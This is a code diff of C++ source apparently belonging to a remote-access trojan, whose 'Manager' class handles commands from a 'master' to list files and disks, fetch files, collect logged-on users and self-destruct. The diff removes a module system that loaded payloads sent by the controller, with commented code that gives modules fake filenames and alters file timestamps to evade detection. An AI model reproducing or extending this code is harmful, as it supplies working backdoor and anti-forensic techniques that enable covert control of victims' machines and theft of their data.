@@ -49,8 +49,6 @@ BOOL Manager::Init()
 
 void Manager::Deinit()
 {
-	m_moduleMgr.DeinitAllModule();
-
 	m_cmdRedirector.Stop();
 }
 
@@ -138,31 +136,6 @@ __time64_t Manager::GetInstallTime()
 	return s_insttime;
 }
 
-BOOL Manager::LoadModule( LPCTSTR modFilename )
-{
-	if (! m_moduleMgr.AddModule(modFilename)) return FALSE;
-
-	m_moduleMgr.AdjustModules();
-
-	return TRUE;
-}
-BOOL Manager::LoadModule(ByteBuffer& content, LPCTSTR modFilename )
-{
-	if (! m_moduleMgr.AddModule(content,modFilename)) return FALSE;
-
-	m_moduleMgr.AdjustModules();
-
-	return TRUE;
-}
-BOOL Manager::DeleteModule(LPCTSTR modFilename)
-{
-	if (! m_moduleMgr.DeleteModule(modFilename))
-	{
-		return FALSE;
-	}
-	return TRUE;
-}
-
 // void ServantManager::AddAllLocalModules()
 // {
 // 	tstring findstr = GetLocalPath();
@@ -213,8 +186,6 @@ BOOL Manager::QueryCommandHandler( MSGID msgid, FnExecuteRCCommand* ppHandler, L
 		DECLARE_MSG_HANDLER(MSGID_DELETE_SERIALID, ExecuteRCCommand_DeleteSerial);
 		DECLARE_MSG_HANDLER(MSGID_LIST_FILES, ExecuteRCCommand_ListFiles);
 		DECLARE_MSG_HANDLER(MSGID_DISKS, ExecuteRCCommand_Disks);
-		DECLARE_MSG_HANDLER(MSGID_INSTALL_MODULE, ExecuteRCCommand_InstallMod);
-		DECLARE_MSG_HANDLER(MSGID_UNINSTALL_MODULE, ExecuteRCCommand_UnInstallMod);
 		DECLARE_MSG_HANDLER(MSGID_SELF_DESTRUCTION, ExecuteRCCommand_SelfDestruction);
 		DECLARE_MSG_HANDLER(MSGID_QUERY_LOGON_USERS, ExecuteRCCommand_CollectLogonUsers);
 		DECLARE_MSG_HANDLER(MSGID_GET_FILE, ExecuteRCCommand_GetFile);
@@ -231,7 +202,7 @@ BOOL Manager::QueryCommandHandler( MSGID msgid, FnExecuteRCCommand* ppHandler, L
 		return TRUE;
 	}
 
-	return m_moduleMgr.QueryCommandHandler(msgid, ppHandler, ppParameter);
+	return FALSE;
 }
 
 void Manager::SimpleReply( const CommData& data, LPCTSTR errorMsg ) const
@@ -339,16 +310,7 @@ void Manager::CollectInfo( CommData& data )
 	data.SetData(_T("cpufrep"),cpuInfo[0].MaxMhz);
 	delete []cpuInfo;
 
-	//获取模块名称列表
-	TStringVector names;
-	m_moduleMgr.ListModuleNames(names);
-	tostringstream ss;
-	TStringVector::iterator nameiter = names.begin();
-	for (; nameiter != names.end(); nameiter++)
-	{
-		ss << nameiter->c_str() << _T(",");
-	}
-	data.SetData(_T("mods"), ss.str().c_str());
+	data.SetData(_T("mods"), _T(""));
 }
 
 BOOL Manager::WriteData2File( const CommData& data, LPCTSTR targetFilepath ) const
@@ -517,20 +479,9 @@ BOOL Manager::ExecuteRCCommand_ListMod( MSGID msgid, const LPBYTE data, DWORD dw
 		return FALSE;
 	}
 
-	Manager* pMgr = (Manager*) lpParameter;
-
-	TStringVector names;
-	pMgr->m_moduleMgr.ListModuleNames(names);
-	tostringstream ss;
-	TStringVector::iterator iter = names.begin();
-	for (; iter != names.end(); iter++)
-	{
-		ss << iter->c_str() << _T(",");
-	}
-
 	CommData reply;
 	reply.Reply(msgdata);
-	reply.SetData(_T("mods"), ss.str().c_str());
+	reply.SetData(_T("mods"), _T(""));
 	
 	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);
 
@@ -626,109 +577,6 @@ BOOL Manager::ExecuteRCCommand_CollectLogonUsers( MSGID msgid, const LPBYTE data
 
 	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, reply);
 
-	return TRUE;
-}
-
-BOOL Manager::ExecuteRCCommand_InstallMod( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
-{
-	Manager* pMgr = (Manager*) lpParameter;
-
-	CommData commData;
-	if (! commData.Parse(data, dwSize))
-	{
-		return FALSE;
-	}
-
-	//获取模块文件真实名称
- 	tstring modrealname;
- 	commData.GetStrData(_T("modname"), modrealname);
-//  	if (modrealname.size() == 0)
-//  	{
-//  		pMgr->SimpleReply(commData, _T("need parameter modname"));
-//  		return FALSE;
-//  	}
-// // 	modFilepath = GetLocalPath();
-// // 	modFilepath += modrealname.c_str();
-// // 	modFilepath += MODULE_POSTFIX;
-// 
-// 	//随机生成模块文件名称
-// 	tstring modname;
-// 	tstring modFilepath;
-// 	int iCounter = 10;
-// 	CHAR fakeNamePrefix[4] = {0};
-// 	memcpy(fakeNamePrefix, g_ConfigInfo.szServantshellRealname, 3);
-// 	do 
-// 	{
-// 		TCHAR testname[16] = {0};
-// 		int num = (double)rand() / (RAND_MAX + 1) * 100;
-// 		_stprintf_s(testname, _T("%s%02d"), a2t(fakeNamePrefix), num);
-// 
-// 		modFilepath = GetLocalPath();
-// 		modFilepath += testname;
-// 		modFilepath += MODULE_POSTFIX;
-// 
-// 		DWORD dwAttrs = ::GetFileAttributes(modFilepath.c_str());
-// 		if (INVALID_FILE_ATTRIBUTES == dwAttrs)
-// 		{
-// 			modname = testname;
-// 			break;
-// 		}
-// 
-// 		iCounter--;
-// 	} while (iCounter > 0);
-// 	if (iCounter <= 0)
-// 	{
-// 		errorLog(_T("make fake modname failed"), modrealname.c_str());
-// 		pMgr->SimpleReply(commData, _T("make fake modfilename failed"));
-// 		return FALSE;
-// 	}
-// 	infoLog(_T("writer modfile."));
-// 	//将数据写入文件
-// 	if (! pMgr->WriteData2File(commData, modFilepath.c_str()))
-// 	{
-// 		errorLog(_T("write modfile failed[%s]"), modFilepath.c_str());
-// 		pMgr->SimpleReply(commData, _T("save modfile failed"));
-// 		return FALSE;
-// 	}
-// 
-// 	//调整写入文件的时间
-// 	AdjustTimes(modFilepath.c_str());
-	
-	//尝试装载模块
-	if (! pMgr->LoadModule((ByteBuffer&)commData.GetByteData(),modrealname.c_str()))
-	{
-		errorLog(_T("load [%s] failed"), modrealname.c_str());
-		pMgr->SimpleReply(commData, _T("install failed"));
-		return FALSE;
-	}
-
-	debugLog(_T("load [%s] OK"), modrealname.c_str());
-	
-	pMgr->SimpleReply(commData, _T("install success"));
-
-	//检查所在目录时间,并调整
-//	CheckDT();
-
-	return TRUE;
-}
-
-BOOL Manager::ExecuteRCCommand_UnInstallMod(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter)
-{
-	Manager* pMgr = (Manager*) lpParameter;
-
-	CommData commData;
-	if (! commData.Parse(data, dwSize))
-	{
-		return FALSE;
-	}
-
-	tstring modrealname;
-	commData.GetStrData(_T("modname"), modrealname);
-
-	if (!pMgr->DeleteModule(modrealname.c_str()))
-	{
-		return FALSE;
-	}
 	return TRUE;
 }
 
@@ -899,21 +747,6 @@ BOOL Manager::ExecuteRCCommand_SelfDestruction( MSGID msgid, const LPBYTE data, 
 	Manager* pMgr = (Manager*) lpParameter;
 	//待清理列表
 	TStringVector tocleanList;
-
-	//将模块加入清理列表
-	TStringVector modnames;
-	pMgr->m_moduleMgr.ListModuleFileNames(modnames);
-	TStringVector::iterator modnameIter = modnames.begin();
-	for (; modnameIter != modnames.end(); modnameIter++)
-	{
-		Module* pModule = NULL;
-		if (pMgr->m_moduleMgr.GetModule(modnameIter->c_str(), &pModule))
-		{
-			tstring modFilepath = pModule->GetModuleFilepath();
-
-			tocleanList.push_back(modFilepath);
-		}
-	}
 
 	//将servant加入清理列表
 	tstring coreFilepath = GetLocalPath();
